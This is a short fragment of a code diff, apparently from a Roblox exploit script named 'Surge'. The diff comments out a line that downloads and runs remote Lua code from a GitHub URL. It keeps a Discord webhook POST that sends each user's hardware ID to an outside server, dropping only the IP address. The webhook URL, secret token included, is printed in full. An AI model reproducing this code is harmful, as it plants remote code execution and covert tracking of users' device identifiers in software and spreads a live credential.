@@ -321,7 +321,7 @@ getgenv().hookmetamethod = newcclosure(function(obj, method, rep)
     return old
 end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Iamomarg/kakaboy/refs/heads/main/sigma.luau"))()
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/Iamomarg/kakaboy/refs/heads/main/sigma.luau"))()
 
 
 task.spawn(function()
@@ -375,7 +375,7 @@ task.spawn(function()
         Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
         Body = HttpService:JSONEncode({
             ['content'] = tostring(message),
-            ['username'] = "Surge User "..gethwid().." "..getip()--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
+            ['username'] = "Surge User "..gethwid()--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
         }),
         Method = 'POST',
         Headers = {
